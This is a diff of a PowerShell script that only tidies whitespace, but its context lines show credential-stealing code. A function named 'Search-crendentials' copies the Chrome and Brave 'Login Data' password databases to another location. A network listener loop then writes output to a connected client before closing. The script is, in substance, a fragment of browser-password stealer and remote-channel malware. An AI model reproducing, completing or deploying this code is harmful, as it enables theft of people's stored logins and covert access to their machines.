@@ -12,18 +12,14 @@ Function Search-crendentials {
 			$paths = @(
 				"$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Login Data",
 				"$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
-				
-					)
+				)
 					
 			foreach ($path in $paths){
 				
 				if(Test-Path $path){
 
                    
-                    			Copy-Item -path $path -destination $destination -force
-					
-					
-					
+                    			Copy-Item -path $path -destination $destination -force	
 				}
 			}
 }
@@ -83,22 +79,12 @@ while($true){
         $writer.WriteLine($formatedoutput)
 
         }
-
-   
-       
-
-        
-
 }
-
-
-
 
 
 #Stopper l'écoute
 $listener.Stop()
 $client.Close()
-
 
 #Get-Content -path $file -raw
 
